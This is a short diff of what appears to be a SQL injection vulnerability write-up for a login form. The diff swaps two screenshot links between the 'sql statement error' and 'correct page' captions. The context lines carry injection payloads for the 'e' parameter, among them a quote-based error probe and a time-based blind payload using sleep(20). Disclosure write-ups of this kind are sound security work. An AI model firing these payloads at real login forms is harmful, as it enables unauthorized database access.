@@ -38,7 +38,7 @@ e=1@2'&p=34&save=Login
 
 sql statement error
 
-![image](https://github.com/XDWHQ/pic/blob/main/right.png)
+![image](https://github.com/XDWHQ/pic/blob/main/err.png)
 
 Payload2: e=1@2''&p=34&save=Login
 
@@ -70,7 +70,7 @@ e=1@2''&p=34&save=Login
 
 correct page
 
-![image](https://github.com/XDWHQ/pic/blob/main/err.png)
+![image](https://github.com/XDWHQ/pic/blob/main/right.png)
 
 Payload3: e=1@2'%2b(select*from(select(sleep(20)))a)%2b'&p=34&save=Login
 
